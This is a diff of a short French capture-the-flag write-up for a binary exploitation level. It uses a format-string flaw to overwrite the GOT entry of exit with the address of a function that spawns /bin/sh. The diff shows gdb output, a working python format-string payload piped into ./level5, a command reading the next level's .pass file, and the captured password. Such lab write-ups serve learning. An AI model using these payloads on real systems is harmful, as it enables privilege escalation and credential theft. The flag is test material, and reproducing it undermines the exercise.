@@ -1,4 +1,7 @@
-dans ce niveau on va utiliser la meme faille de securite que pour les exercice precedent et changer l'appel de la fonction exit par l'appel a la fonction o
+dans ce niveau on va utiliser la meme faille que pour les 2 exercice precedent afin de changer
+l'addresse de linkage de la fonction exit de la libc par l'addresse de notre fonction o
+
+1 - trouver l'addresse de la fonction exit a modifer
 
 End of assembler dump.
 (gdb) x/i 0x80483d0
@@ -6,13 +9,19 @@ End of assembler dump.
 (gdb) x 0x8049838
    0x8049838 <exit@got.plt>:	(bad)
 
+addresse de linkage de la fonction exit : 0x08049838
 
-addresse modifiable de la fonction exit : 0x08049838
+2 - trouver l'adresse de notre fonction o
 
 0x80484a4 <o>:	0x83e58955
 (gdb)
 
 addresse de la fonction o faisant un appel system a /bin/sh : 0x080484a4
 
+ base 16      base10
+0x80484a4 = 134513828
 
 cat <(python -c 'print("\x38\x98\x04\x08" + "%134513824x" + "%4$n")') - | ./level5
+  200
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
